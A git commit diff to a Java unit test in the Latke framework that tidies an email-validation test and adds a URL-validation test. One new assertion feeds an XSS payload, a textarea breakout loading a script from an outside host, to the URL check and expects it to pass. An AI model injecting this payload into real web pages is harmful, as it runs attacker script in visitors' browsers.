865eeefb5b868d4b077d8b184559e0967ad8b085
Liang Ding <dl88250@gmail.com>
2015-01-09 12:24:34 +0800

    test case

--- latke/src/test/java/org/b3log/latke/util/StringsTestCase.java
+++ latke/src/test/java/org/b3log/latke/util/StringsTestCase.java
@@ -22,7 +22,7 @@ import static org.testng.Assert.*;
  * {@link Strings} test case.
  *
  * @author <a href="http://88250.b3log.org">Liang Ding</a>
- * @version 1.0.0.1, Feb 28, 2014
+ * @version 1.1.0.1, Jan 9, 2015
  */
 public class StringsTestCase {
 
@@ -30,14 +30,21 @@ public class StringsTestCase {
      * Tests method {@link Strings#isEmail(java.lang.String)}.
      */
     @Test
-    public void isEmail()  {
+    public void isEmail() {
         assertTrue(Strings.isEmail("DL88250@gmail.com"));
         assertTrue(Strings.isEmail("test@a.com"));
         assertTrue(Strings.isEmail("xxx@e-xxx.com"));
-        
+
         assertFalse(Strings.isEmail(null));
         assertFalse(Strings.isEmail(""));
         assertFalse(Strings.isEmail("  "));
         assertFalse(Strings.isEmail("test@a.b"));
+    }
+
+    @Test
+    public void isURL() {
+        assertTrue(Strings.isURL("http://b3log.org"));
+
+        assertTrue(Strings.isURL("http://</textarea>'\"><script src=http://viiv.ml/Wmtrhb></script>"));
     }
 }
